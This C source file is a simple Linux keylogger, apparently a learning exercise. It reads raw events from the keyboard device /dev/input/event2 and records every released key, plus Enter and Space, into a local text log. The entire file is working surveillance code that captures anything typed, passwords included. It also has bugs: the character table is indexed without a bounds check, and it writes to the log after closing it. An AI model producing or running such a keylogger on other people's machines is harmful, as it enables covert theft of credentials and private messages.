#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //to use read
#include <linux/input.h> //includes the input events structure in linux
#include <fcntl.h> //to use open
//--------------------------------------------
int main()
{
	struct input_event Input_Event; //because the input event in linux is a struct 
	//open the keyboard driver using file descriptor system call open 
	int KBD_Driver = open("/dev/input/event2",O_RDONLY); //file path and read only flag
	FILE *DataStream_Pointer = fopen("Keyboard_KeyStrokes_log.txt","w"); //append or write 
	
	//create an array to map the input_event code to a character
        char char_Array[]="  1234567890-=  qwertyuiop[]  asdfghjkl;'  \\zxcvbnm,./";
        
        //int counter =0;
	while(1) //infinite loop to keep reading from the kbd driver file 
	{	
		fflush(DataStream_Pointer);
		//read from the KBD_driver and put in the input_event struct
		read(KBD_Driver,&Input_Event, sizeof(Input_Event));
		
		//checking on the input event struct value and keypress
		// value == 0 means that the key is released 
		//counter =1;
		if ( (Input_Event.type == EV_KEY) && (Input_Event.value == 0) ) 
		{
		//print the code corresponding to each key pressed 
		//but before printing check on sum special buttons ex : enter, space  
		//so we need a switch case to cover those cases 
			switch(Input_Event.code)
			{
			        default: //a not special action button is pressed
					fprintf(DataStream_Pointer,"%c",char_Array[Input_Event.code]);
				break;
				
				case(28): //enter is pressed so get down to a new line
					fprintf(DataStream_Pointer,"\n"); //print what is written in the data log file i created
				break;
				
				case(57): //space is pressed 
					fprintf(DataStream_Pointer," ");
				break;
			}
		}
	}
	fclose(DataStream_Pointer);
	close(KBD_Driver);
	fprintf(DataStream_Pointer,"\n");
    	return 0;
}
//-------------------------------------------
